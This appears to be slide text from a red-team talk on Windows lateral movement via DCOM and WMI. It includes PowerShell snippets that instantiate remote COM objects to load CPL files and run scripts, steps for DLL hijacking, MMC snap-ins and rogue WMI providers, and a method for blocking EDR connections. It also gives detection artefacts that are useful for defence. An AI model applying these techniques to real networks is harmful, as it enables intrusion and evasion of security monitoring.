We can use ShellWindows.Application.ControlPanelItem to 
execute a CPL file.
Haven’t seen this being abused before (?)
DCOM -CONTROLPANELITEM
https://docs.microsoft.com/en-us/windows/win32/shell/shell-controlpanelitem
In a nutshell, CPL files are DLLs that export a function called CPlApplet.
DCOM -CONTROLPANELITEM
Plenty of open source projects aimed at weaponizing this file format, such as: 
https://github.com/rvrsh3ll/CPLResourceRunner
The actual attack:
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-
11CF-A442-00A0C90A8F39”, ”target”))
$i = $a.Item()
$i.Document.Application.ControlPanelItem("C:\Users\Developer\source\repos\DummyC
PL\x64\Release\DummyCPL.cpl")
DCOM -CONTROLPANELITEM
The A.C.T.U.A.L. attack:
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("0006F033-0000-
0000-C000-000000000046", "192.168.232.133"))  # Outlook.Application
$shell = $a.CreateObject("Shell.Application") 
$shell.ControlPanelItem(”C:\dummy.cpl”)
DCOM -CONTROLPANELITEM
Anomalous process tree when executing this 
technique:
▪ Outlook  spawned with –Embedding
▪ Outlook spawns control.exe 
▪ Control.exe spawns rundll32
Pretty easy to spot, if you’re looking for it.
DCOM -CONTROLPANELITEM
DCOM
$EDR-VENDOR
“””Fun””” fact! $EDR-VENDOR registers a COM 
server that allows you to arbitrarily load a 
PowerShell script from disk 😱
However, it requires Administrative access 
(high integrity token) and by default cannot be 
launched remotely due to this configuration
DCOM –$EDR-VENDOR
Luckily for us, this can be bypassed in at least two ways:
▪ Programmatically modify the DCOM launch permissions using remote registry 
(untested but demonstrated by other researchers, see ref below)
▪ Abuse the same Outlook COM object to delegate the creation of the $EDR-vendor
object locally -> Spoiler, it worked.
DCOM –$EDR-VENDOR
https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
# instantiates Outlook COM
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("0006F033-0000-0000-
C000-000000000046", ”REMOTE"))
# Creates the target object
$shell = $a.CreateObject(“$vendor-sus-method") 
# set up dummy var
[String[]] $TestArray = "" 
$dummy = "" 
# lmao
$shell.InvokeScript("C:\Users\Public\Desktop\test.ps1",$TestArray, $ dummy)
DCOM –$EDR-VENDOR
DCOM
DLLHIJACK
An approach is to look for programs that can be executed via DCOM but are also 
vulnerable to DLL hijacking. The process to discover using ProcMon + OleviewDotNet
is simple:
▪ Find all the CLSID by server
▪ Find something that looks odd 
▪ Open ProcMon and filter for NAME NOT FOUND
▪ Instantiate an object of the target class
DCOM –HIJACK
https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement
-part-3-dll-hijacking/
DCOM –HIJACK
CoBrmEngine’s COM object is at CLSID 494C063B-1024-4DD1-89D3-
713784E82044. 
Missing VERSION.dll in C:\windows\system32\spool\tools
DCOM –HIJACK ON COBRMENGINE
DCOM –HIJACK ON COBRMENGINE
DCOM –HIJACK ON COBRMENGINE
Execution happens in the PrintBrmEngine.exe process, that gets spawned 
with the –Embedding command line argument. 
DCOM
Filesystem Artefacts
Host Artefacts
Network Artefacts
Prevalence - IoC
DCOM - CPL
Uploads a binary on 
disk
Creates a new Registry 
Keys
Directly connect
Less known technique
DCOM - $EDR-
VENDOR
Uploads a PowerShell 
script on disk
None
Directly connect
Unknown Technique
DCOM – DLL Hijack
Uploads a binary on 
disk
None
Directly connect
Less Known Technique 
– potentially unknown
DCOM
MMC20 BACK FROM 
THE DEAD
MMC20.Application.Document.SnapIns.Add() takes a string as an input and 
loads a SnapIn.
DCOM –MMC20 BACK FROM THE 
DEAD
▪ It turns out that it’s not that hard to create 
a custom SnapIn, and of course MSDN 
comes into rescue!
▪ MSDN - How-To Create a Hello World 
Snap-in
▪ The registration of a new SnapIn is mostly 
based on registry operations
DCOM –MMC20 BACK FROM THE 
DEAD
▪ We can then invoke the Add method and our DLL will be loaded by MMC.exe
DCOM –MMC20 BACK FROM THE 
DEAD
▪ Our assembly will get loaded and we can finally enjoy some shells
DCOM –MMC20 BACK FROM THE 
DEAD
DCOM
Filesystem Artefacts
Host Artefacts
Network Artefacts
Prevalence - IoC
DCOM – MMC20 
Snapin
Uploads a binary on 
disk
Creates a new Registry 
Keys
Directly connect to 
create and trigger the 
task
Unknow technique
DCOM
BONUS
DCOM –BLOCK EDR CONNECTIONS
It is also possible to remotely configure the 
Windows Firewall and instruct it to deny 
outbound connections that are originated 
from specific binaries!  
The COM objects we will use are 
HNetCfg.FwPolicy2/FwMgr
DCOM –BLOCK EDR CONNECTIONS
DCOM –BLOCK EDR CONNECTIONS
WMI BASED
EXECUTION METHODS
WMI Event Subscription are composed by:
▪ An event filter – a WQL query that filters event and looks for a specific condition
▪ An event consumer  - The action we want to take when the event is fired
▪ An event binder  - The binding of a filter and a consumer 
WMI Event subscriptions can be used for both persistence and lateral movement, as 
documented by others and more recently by MDSec. 
WMI –EVENT SUBSCRIPTION
https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-
part-1-wmi-event-subscription/
The power of this technique lies in the fact that as an event consumer, we can specify Jscript 
or VBS – meaning that we can use GadgetToJScript to load arbitrary .NET assemblies in 
memory  and we can avoid touching the disk entirely.
No PoC of this specific chain existed, so I made one:
https://github.com/RiccardoAncarani/LiquidSnake
WMI –EVENT SUBSCRIPTION
WMI –EVENT SUBSCRIPTION
The flow is pretty simple:
1. The attacker creates a malicious WMI Event Sub 
on a remote host, that will trigger when an 
authentication attempt happens and will load our 
.NET module
2. The event subscription is triggered manually using 
DCOM
3. The loaded .NET assembly  waits on a named pipe
4. The attacker sends the final beacon shellcode 
over the pipe remotely
WMI –EVENT SUBSCRIPTION
WMI –EVENT SUBSCRIPTION
Filesystem Artefacts
Host Artefacts
Network Artefacts
Prevalence - IoC
LiquidSnake
None
Creates a new WMI 
Event Subscription
Directly connect to 
create and trigger the 
task
Less known technique
WMI
ROGUE PROVIDERS
As documented by Cybereason, it is possible to register a rogue WMI provider in order to 
execute arbitrary commands or load specific DLLs. 
Since WMI providers are implemented as COM objects, we can create some registry keys and 
load the provider dynamically:
▪ We can create a LocalServer32 entry to execute a command
▪ We can create a InProcServer32 to load an arbitrary DLL
WMI –ROGUE PROVIDERS
https://www.cybereason.com/blog/wmi-lateral-movement-win32
Adding a new COM object in the 
registry can be easily done via 
Remote Registry or WMI:
WMI –ROGUE PROVIDERS
Registration and loading of the provider can be done via WMI:
WMI –ROGUE PROVIDERS
Can be achieved with:
▪ LocalServer32  
▪ InProcServer32
P.S: Use DLL’s DETACH to avoid process being 
killed
WMI –ROGUE PROVIDERS
WMI –ROGUE PROVIDERS
Filesystem Artefacts
Host Artefacts
Network Artefacts
Prevalence - IoC
Rogue Provider –
LocalServer32
DLL/PE/msbuild on 
disk
Creates a new WMI 
Provider
Directly connect to 
create and trigger the 
load of the provider
Less known technique
Rogue Provider –
InProcServer32
DLL on disk
DLL/PE/msbuild on 
disk
Directly connect to 
create and load of the 
provider
Less known technique
WE’RE ALMOST DONE!
C2 –C3?
C3 is aimed at breaking these patterns by using unconventional and indirect 
communication media, such as:
▪ File share, works with RDP shared drives as well
▪ LDAP
▪ Printers
▪ VMWare, wtf?
Not the right place for a C3 deep dive, for reference see the BlackHat’s talk Breaking 
Network Segregation Using Esoteric Command & Control Channels 
CONCLUSIONS
The main takeaways from the talk are:
▪ You can use most of the persistence techniques with minimal re-adaptation to 
achieve lateral movement. This will decouple the deployment of the payload with 
its execution, massively decreasing detection opportunities.
▪ Every technique can be seen as a combination of primitives, like uploading a payload, 
creating something (service, task, process) and executing it. Look for the techniques 
that reduce the number of primitives required.